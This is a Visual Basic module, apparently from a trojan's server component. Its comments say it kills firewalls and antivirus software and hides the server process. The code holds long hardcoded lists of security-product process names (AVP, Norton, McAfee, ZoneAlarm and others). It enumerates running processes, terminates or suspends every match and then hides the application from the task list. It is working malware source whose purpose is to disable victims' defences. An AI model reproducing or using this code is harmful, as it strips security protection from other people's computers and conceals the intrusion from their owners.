Attribute VB_Name = "Matrix"
'This module resposable for stuff like :-
'Killing firewalls and antiviruses
'Hidding the server file from the taskmanager
'registr the server file as a service in (NT Systems)
Option Explicit
Private Declare Function OpenProcess Lib "Kernel32.dll" (ByVal dwDesiredAccessas As Long, ByVal bInheritHandle As Long, ByVal dwProcId As Long) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function CreateToolHelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, ByVal lProcessID As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal HSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal HSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Const MAX_PATH As Integer = 260
Private Type PROCESSENTRY32
       dwSize As Long
       cntUsage As Long
       th32ProcessID As Long
       th32DefaultHeapID As Long
       th32ModuleID As Long
       cntThreads As Long
       th32ParentProcessID As Long
       pcPriClassBase As Long
       dwFlags As Long
       szExeFile As String * MAX_PATH
End Type
Public I%
Private Const KillList = "_AVP32,_AVP32.EXE,_AVPCC,_AVPCC,_AVPCC.EXE,_AVPM,_AVPM.EXE,AckWin32,AckWin32,ACKWIN32,AckWin32.exe,AckWin32.exe,ACKWIN32.EXE,ADVXDWIN,ADVXDWIN.EXE,agentw.exe,ALERTSVC,ALERTSVC.EXE,ALOGSERV,alogserv,ALOGSERV,alogserv.exe,ALOGSERV.EXE,AMON9X,AMON9X.EXE,ANTI-TROJAN,ANTI-TROJAN.EXE,ANTS,ANTS.EXE,APVXDWIN,apvxdwin,APVXDWIN.EXE,apvxdwin.exe,ATCON,ATCON.EXE,ATUPDATER,ATUPDATER.EXE,ATWATCH,ATWATCH.EXE,AUTODOWN,AutoDown,AUTODOWN,AUTODOWN.exe,AutoDown.exe,AUTODOWN.EXE,AutoTrace,AutoTrace.exe,AVCONSOL,AVCONSOL.EXE,AVGCC32,AVGCC32,AVGCC32.EXE,AVGCC32.EXE,AVGCTRL,Avgctrl,AVGCTRL.EXE,Avgctrl.exe,AvgServ,AVGSERV,AvgServ,AVGSERV,AVGSERV.EXE,AVGSERV.EXE,AVGSERV9,AVGSERV9.EXE,AVGW,AVGW.EXE,avkpop,avkpop.exe,AvkServ,AvkServ.exe,avkservice,avkservice.exe,avkwctl9,avkwctl9.exe,AVP,AVP.EXE,AVP32,AVP32.EXE,AVPCC,avpm,avpm,AVPM,avpm.exe,AVPM.EXE,Avsched32,Avsched32.exe,AvSynMgr,AVSYNMGR,AVSYNMGR,AvSynMgr,AVSYNMGR,AVSYNMGR.exe,AVWINNT,AVWINNT.EXE,AVXMONITOR9X,AVXMONITOR9X,AVXMONITOR9X.EXE"
Private Const KillList2 = "AVXMONITOR9X.EXE,AVXMONITORNT,AVXMONITORNT,AVXMONITORNT.EXE,AVXMONITORNT.EXE,AVXQUAR,AVXQUAR,AVXQUAR.EXE,AVXQUAR.EXE.EXE,AVXW,AVXW.EXE,blackd,BLACKD,blackd.exe,BLACKD.EXE,BlackICE,BlackICE.exe,ccApp.exe,ccEvtMgr,ccEvtMgr.exe,ccPxySvc.exe,ccPxySvc.exe,CDP.EXE,cfgWiz,cfgWiz.exe,Claw95,Claw95,CLAW95,Claw95.exe,Claw95.exe,CLAW95.EXE,Claw95cf,CLAW95CF,Claw95cf.exe,CLAW95CF.EXE,cleaner,cleaner.EXE,cleaner3,cleaner3.EXE,CMGRDIAN,CMGrdian,CMGRDIAN,CMGRDIAN.EXE,CONNECTIONMONITOR,CONNECTIONMONITOR.EXE,CPD,cpd.exe,cpd.exe,CPDClnt,CPDCLNT.EXE,CPDClnt.exe,CTRL,CTRL.EXE,defalert,defalert.exe,defscangui,defscangui.exe,DEFWATCH,DEFWATCH.EXE,DOORS,DOORS,DOORS.EXE,DOORS.EXE,DVP95,DVP95.EXE,DVP95_0,DVP95_0.EXE,EFPEADM,EFPEADM,EFPEADM.exe,EFPEADM.EXE,ETRUSTCIPE,ETRUSTCIPE,ETRUSTCIPE.exe,ETRUSTCIPE.EXE,EVPN,EVPN,EVPN.exe,EVPN.EXE,EXPERT,EXPERT.EXE,F-AGNT95,F-AGNT95.EXE,fameh32,fameh32.exe,fch32,fch32.exe,fih32fih32.exe,fnrb32,fnrb32.exe,F-PROT,F-PROT.EXE,F-PROT95,F-PROT95.EXE,FP-WIN"
Private Const KillList3 = "FP-WIN.EXE,FRW,FRW,FRW.EXE,FRW.EXE,fsaa,fsaa.exe,fsav32,fsav32.exe,fsgk32,fsgk32.exe,fsm32,fsm32.exe,fsma32,fsma32.exe,fsmb32,fsmb32.exe,f-stopw,F-STOPW,f-stopw.exe,F-STOPW.EXE,gbmenu,gbmenu.exe,GBPOLL,gbpoll,GBPOLL.EXE,gbpoll.exe,GENERICS,GENERICS.EXE,GUARD,GUARD,GUARD.EXE,GUARD.EXE,GUARDDOG,GUARDDOG.EXE,iamapp,IAMAPP,IAMAPP,iamapp.exe,IAMAPP.EXE,IAMAPP.EX,iamserv,IAMSERV,iamserv.exe,IAMSERV.EXE,IAMSTATS,IAMSTATS.EXE,ICLOAD95,ICLOAD95.EXE,ICLOADNT,ICLOADNT,ICLOADNT.EXE,ICLOADNT.EXE,ICMON,ICMON.EXE,ICSUPP95,ICSUPP95,ICSUPP95.EXE,ICSUPP95.EXE,ICSUPPNT,ICSUPPNT.EXE,IFACE,IFACE.EXE,IOMON98,IOMON98,IOMON98.EXE,IOMON98.EXE,ISRV95,ISRV95.EXE,JEDI,JEDI.EXE,LDNETMON,LDNETMON.EXE,LDPROMENU,LDPROMENU.EXE,LDSCAN,LDSCAN.EXE,LOCKDOWN,LOCKDOWN.EXE,lockdown2000,LOCKDOWN2000,lockdown2000.exe,LOCKDOWN2000.EXE,LUALL,LUALL.EXE,LUCOMSERVER,LUCOMSERVER.EXE,LUSPT,LUSPT.exe,MCAGENT,MCAGENT.EXE,MCMNHDLR,MCMNHDLR.EXE,Mcshield.exe,MCTOOL,MCTOOL.EXE,MCUPDATE,MCUPDATE.EXE,MCVSRTE"
Private Const KillList4 = "MCVSSHLD.EXE,MGAVRTCL,MGAVRTCL.EXE,MGAVRTE,MGAVRTE.EXE,MGHTML,MGHTML.EXE,MINILOG,MINILOG.EXE,Monitor,MONITOR,Monitor.exe,MONITOR.EXE,,MOOLIVE,MOOLIVE.EXE,MPFAGENT.EXE,MPFSERVICE,MPFSERVICE.exe,MPFTRAY.EXE,MWATCH,MWATCH,MWATCH.exe,MWATCH.EXE,NAV Auto-Protect,NAV Auto-Protect,NAVAP,NAVAP,navapsvc,navapsvc,NAVAPSVC.EXE,navapsvc.exe,navapw32,NAVAPW32,NAVAPW32.EXE,NAVENGNAVEX15,NAVENGNAVEX15,NAVLU32,NAVLU32.EXE,Navw32,NAVW32,Navw32.exe,NAVWNT,NWNT.EXE,NDD32,NDD32.EXE,NeoWatchLog,NeoWatchLog.exe,NETUTILS,NETUTILS.EXE,NISSERV,NISSERV,NISSERV.EXE,NISSERV.EXE,NISSERV.EXE,NISUM,NISUM,NISUM.EXE,NISUM.EXE,NMAIN,NMAIN.EXE,NORMIST,NORMIST,NORMIST.EXE,NORMIST.EXE,notstart,notstart.exe,NPROTECT,NPROTECT.EXE,npscheck,npscheck.exe,NPSSVC,NPSSVC.EXE,NSCHED32,NSCHED32.EXE,ntrtscan,ntrtscan.EXE,NTVDM,NTVDM.EXE,NTXconfig,NTXconfig.exe,Nui.EXE,Nupgrade,Nupgrade.exe,NVC95,NVC95,NVC95.EXE,NVC95.EXE,NVSVC32,NVSVC32,NWService,NWService.exe,NWTOOL16,NWTOOL16.EXE,PADMIN,PADMIN.EXE,MCVSRTE.EXE,MCVSSHLD"
Private Const KillList5 = "PAVPROXY,pavproxy,PAVPROXY.exe,pavproxy.exe,PCCIOMON,PCCIOMON,PCCIOMON.EXE,PCCIOMON.EXE,pccntmon,pccntmon.EXE,pccwin97,pccwin97.EXE,PCCWIN98,PCCWIN98.EXE,pcscan,pcscan.EXE,PERSFW,PERSFW.EXE,VSMAIN.EXE,vsmon,vsmon.exe,VSMON.EXE,VSSTAT,VSSTAT,VSSTAT.EXE,WATCHDOG,WATCHDOG.EXE,WEBSCANX,WEBSCANX,WEBSCANX.EXE,WEBTRAP,WEBTRAP.EXE,WGFE95,WGFE95.EXE,WIMMUN32,WIMMUN32.EXE,WrAdmin,WRADMIN,WRADMIN,WrAdmin.exe,WRADMIN.EXE,WRADMIN.EXE,WrCtrl,WRCTRL,WRCTRL,WrCtrl.exe,WRCTRL.EXE,zapro,zapro.exe,zonealarm,zonealarm.exe,pfinder.exe,zlclient.exe,ZCLIENT"
Public MatrixTimer As Long
Public Sub ProcessKiller()
Dim HSnapshot As Long, r As Long, PID As Long, q As Long, szExename As String, uProcess As PROCESSENTRY32, killa As String
HSnapshot = CreateToolHelpSnapshot(2&, 0&)
If HSnapshot = 0 Then Exit Sub
uProcess.dwSize = Len(uProcess)
r = ProcessFirst(HSnapshot, uProcess)
Do While r
    I = InStr(1, uProcess.szExeFile, Chr(0))
    szExename = LCase$(Left$(uProcess.szExeFile, I - 1))
    PID = uProcess.th32ProcessID
    If InStr(1, KillList, StripFileName(szExename), vbTextCompare) Then KillProcessById PID
    r = ProcessNext(HSnapshot, uProcess)
Loop
Call CloseHandle(HSnapshot)
End Sub
Public Sub ProcessKiller2()
Dim HSnapshot As Long, r As Long, PID As Long, q As Long, szExename As String, uProcess As PROCESSENTRY32, killa As String
HSnapshot = CreateToolHelpSnapshot(2&, 0&)
If HSnapshot = 0 Then Exit Sub
uProcess.dwSize = Len(uProcess)
r = ProcessFirst(HSnapshot, uProcess)
Do While r
    I = InStr(1, uProcess.szExeFile, Chr(0))
    szExename = LCase$(Left$(uProcess.szExeFile, I - 1))
    PID = uProcess.th32ProcessID
    If InStr(1, KillList2, StripFileName(szExename), vbTextCompare) Then KillProcessById PID
    r = ProcessNext(HSnapshot, uProcess)
Loop
Call CloseHandle(HSnapshot)
End Sub
Public Sub ProcessKiller3()
Dim HSnapshot As Long, r As Long, PID As Long, q As Long, szExename As String, uProcess As PROCESSENTRY32, killa As String
HSnapshot = CreateToolHelpSnapshot(2&, 0&)
If HSnapshot = 0 Then Exit Sub
uProcess.dwSize = Len(uProcess)
r = ProcessFirst(HSnapshot, uProcess)
Do While r
    I = InStr(1, uProcess.szExeFile, Chr(0))
    szExename = LCase$(Left$(uProcess.szExeFile, I - 1))
    PID = uProcess.th32ProcessID
    If InStr(1, KillList3, StripFileName(szExename), vbTextCompare) Then KillProcessById PID
    r = ProcessNext(HSnapshot, uProcess)
Loop
Call CloseHandle(HSnapshot)
End Sub
Public Sub ProcessKiller4()
Dim HSnapshot As Long, r As Long, PID As Long, q As Long, szExename As String, uProcess As PROCESSENTRY32, killa As String
HSnapshot = CreateToolHelpSnapshot(2&, 0&)
If HSnapshot = 0 Then Exit Sub
uProcess.dwSize = Len(uProcess)
r = ProcessFirst(HSnapshot, uProcess)
Do While r
    I = InStr(1, uProcess.szExeFile, Chr(0))
    szExename = LCase$(Left$(uProcess.szExeFile, I - 1))
    PID = uProcess.th32ProcessID
    If InStr(1, KillList4, StripFileName(szExename), vbTextCompare) Then KillProcessById PID
    r = ProcessNext(HSnapshot, uProcess)
Loop
Call CloseHandle(HSnapshot)
End Sub
Public Sub ProcessKiller5()
Dim HSnapshot As Long, r As Long, PID As Long, q As Long, szExename As String, uProcess As PROCESSENTRY32, killa As String
HSnapshot = CreateToolHelpSnapshot(2&, 0&)
If HSnapshot = 0 Then Exit Sub
uProcess.dwSize = Len(uProcess)
r = ProcessFirst(HSnapshot, uProcess)
Do While r
    I = InStr(1, uProcess.szExeFile, Chr(0))
    szExename = LCase$(Left$(uProcess.szExeFile, I - 1))
    PID = uProcess.th32ProcessID
    If InStr(1, KillList5, StripFileName(szExename), vbTextCompare) Then KillProcessById PID
    r = ProcessNext(HSnapshot, uProcess)
Loop
Call CloseHandle(HSnapshot)
End Sub
Public Sub KillProcessById(p_lngProcessId As Long)
'This function Tried to kill the process else , it suspended it
Dim lnghProcess As Long, lngReturn As Long
    lnghProcess = OpenProcess(1&, -1&, p_lngProcessId)
    If lnghProcess > 0 Then
        lngReturn = TerminateProcess(lnghProcess, 0&)
    Else
        SuspendProcess p_lngProcessId
    End If
End Sub
Public Function StripFileName(FilePAth As String) As String
Dim Path As Variant
If InStr(1, FilePAth, "\", vbTextCompare) > 0 Then
    Path = Split(FilePAth, "\")
    StripFileName = Path(UBound(Path))
Else
    StripFileName = FilePAth
End If
End Function
Public Sub KillGuys()
ProcessKiller
ProcessKiller2
ProcessKiller3
ProcessKiller4
ProcessKiller5
App.TaskVisible = False
End Sub
